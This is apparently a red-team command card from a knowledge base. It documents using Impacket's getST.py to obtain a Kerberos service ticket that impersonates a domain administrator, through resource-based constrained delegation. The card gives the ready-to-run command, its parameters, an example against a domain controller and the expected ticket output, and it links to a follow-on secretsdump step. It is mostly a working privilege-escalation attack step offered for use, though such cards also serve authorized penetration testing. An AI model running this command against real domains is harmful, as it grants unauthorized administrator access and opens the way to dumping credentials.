---
id: 8705d2fb-8f36-4dd2-b0e5-d6086f1867cb
name: getst-impersonate-admin-ticket
type: command
executor: bash
data: >-
  getST.py -spn host/$_TARGET_SERVER.$_DOMAIN
  '$_DOMAIN/$_MACHINE_ACCOUNT:$_PASSWORD' -impersonate $_TARGET_USERNAME
output: null
created_at: '2023-04-06T03:56:05.533144+00:00'
updated_at: '2023-04-10T20:26:36.992508+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - impersonation
verified: true
validated: true
---

# getst-impersonate-admin-ticket

## Command

```bash
getST.py -spn host/$_TARGET_SERVER.$_DOMAIN '$_DOMAIN/$_MACHINE_ACCOUNT:$_PASSWORD' -impersonate $_TARGET_USERNAME
```

## Description

Requests a Kerberos service ticket (TGS) for the target SPN, impersonating a specified user using the delegated machine account.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -spn | Service Principal Name (e.g., host/second-dc-server.local) | Yes |
| $_DOMAIN | Domain name | Yes |
| $_MACHINE_ACCOUNT | Delegated machine account | Yes |
| $_PASSWORD | Machine account password | Yes |
| -impersonate | User to impersonate (e.g., DOMAIN_ADMIN_USER_NAME) | Yes |
| $_TARGET_SERVER | Target server name | Yes |
| $_TARGET_USERNAME | Impersonation target | Yes |

## Examples

### Basic Usage

```bash
getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME
```

## Expected Output

Service ticket saved to DOMAIN_ADMIN_USER_NAME.ccache

$ klist
Ticket cache: FILE:/tmp/krb5cc_...
Default principal: ...

## Related

- [[procedures/resource-based-constrained-delegation-via-printerbug]]
- [[commands/secretsdump-connect-using-ticket]]
